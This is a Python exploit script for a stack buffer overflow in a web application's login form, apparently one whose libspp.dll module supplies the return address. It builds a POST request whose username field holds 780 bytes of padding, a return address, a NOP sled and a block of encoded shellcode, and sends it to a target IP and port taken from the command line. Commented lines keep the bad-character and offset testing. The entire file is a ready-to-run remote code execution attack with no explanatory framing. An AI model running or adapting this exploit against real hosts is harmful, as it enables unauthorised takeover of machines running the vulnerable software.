#!/usr/bin/python
import socket, sys

if len(sys.argv) != 3:
    print("Modo de uso: python ag_bufferoverflow.py <IP> <Port>")
    sys.exit()

target = sys.argv[1]
port = sys.argv[2]

# badchars = \x00\x0a\x0d\x25\x26\x3d
chars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = ("\xd9\xcc\xba\x72\xce\x39\xa8\xd9\x74\x24\xf4\x5e\x31\xc9"
"\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x24\xdd\xdb\x5d\x34"
"\x09\x99\x9e\xc4\xca\xfe\x17\x21\xfb\x3e\x43\x22\xac\x8e"
"\x07\x66\x41\x64\x45\x92\xd2\x08\x42\x95\x53\xa6\xb4\x98"
"\x64\x9b\x85\xbb\xe6\xe6\xd9\x1b\xd6\x28\x2c\x5a\x1f\x54"
"\xdd\x0e\xc8\x12\x70\xbe\x7d\x6e\x49\x35\xcd\x7e\xc9\xaa"
"\x86\x81\xf8\x7d\x9c\xdb\xda\x7c\x71\x50\x53\x66\x96\x5d"
"\x2d\x1d\x6c\x29\xac\xf7\xbc\xd2\x03\x36\x71\x21\x5d\x7f"
"\xb6\xda\x28\x89\xc4\x67\x2b\x4e\xb6\xb3\xbe\x54\x10\x37"
"\x18\xb0\xa0\x94\xff\x33\xae\x51\x8b\x1b\xb3\x64\x58\x10"
"\xcf\xed\x5f\xf6\x59\xb5\x7b\xd2\x02\x6d\xe5\x43\xef\xc0"
"\x1a\x93\x50\xbc\xbe\xd8\x7d\xa9\xb2\x83\xe9\x1e\xff\x3b"
"\xea\x08\x88\x48\xd8\x97\x22\xc6\x50\x5f\xed\x11\x96\x4a"
"\x49\x8d\x69\x75\xaa\x84\xad\x21\xfa\xbe\x04\x4a\x91\x3e"
"\xa8\x9f\x36\x6e\x06\x70\xf7\xde\xe6\x20\x9f\x34\xe9\x1f"
"\xbf\x37\x23\x08\x2a\xc2\xa4\x9b\xbf\xd8\x3e\x8c\xbd\xe0"
"\x3f\xf7\x4b\x06\x55\x17\x1a\x91\xc2\x8e\x07\x69\x72\x4e"
"\x92\x14\xb4\xc4\x11\xe9\x7b\x2d\x5f\xf9\xec\xdd\x2a\xa3"
"\xbb\xe2\x80\xcb\x20\x70\x4f\x0b\x2e\x69\xd8\x5c\x67\x5f"
"\x11\x08\x95\xc6\x8b\x2e\x64\x9e\xf4\xea\xb3\x63\xfa\xf3"
"\x36\xdf\xd8\xe3\x8e\xe0\x64\x57\x5f\xb7\x32\x01\x19\x61"
"\xf5\xfb\xf3\xde\x5f\x6b\x85\x2c\x60\xed\x8a\x78\x16\x11"
"\x3a\xd5\x6f\x2e\xf3\xb1\x67\x57\xe9\x21\x87\x82\xa9\x42"
"\x6a\x06\xc4\xea\x33\xc3\x65\x77\xc4\x3e\xa9\x8e\x47\xca"
"\x52\x75\x57\xbf\x57\x31\xdf\x2c\x2a\x2a\x8a\x52\x99\x4b"
"\x9f")

# return_address = 0x10090c83 - libspp.dll
data = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 16 + shellcode
# data = "A" * 780 + "\x83\x0c\x09\x10" + "C" * (1200-784)
# data = "A" * 780 + "BBBB" + chars * (1200-784)

size = len(data) + len("username=&password=A")

request="POST /login HTTP/1.1\r\n"
request+="Host: "+str(target)+"\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Referer: http://"+str(target)+"/login\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(size)+"\r\n"
request+="DNT: 1\r\n"
request+="Connection: close\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+="username="+data+"&password=A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,int(port)))
s.send(request)